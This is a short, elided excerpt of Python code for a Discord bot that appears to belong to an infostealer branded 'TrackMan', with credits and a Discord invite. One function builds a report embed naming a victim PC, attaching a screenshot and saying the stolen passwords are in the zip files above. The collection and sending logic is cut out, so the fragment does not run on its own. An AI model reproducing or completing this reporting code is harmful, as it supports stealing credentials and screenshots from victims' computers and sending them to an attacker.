...
async def start_messagesend(bot, guild):
    def create_main_embed(guild_name, screenshot_img):
        ...
        embed = discord.Embed(
            ...
            description=f"Here is the full info of: **{pc_name}**. P.S. : passwords are in the zip files above**",
            color=16734003
        )
        ...
        embed.add_field(name='💳 Credits', value=f"[Join TrackMan Official Discord]({discordinv})\nMade by Raywzw", inline=False)        
        return embed
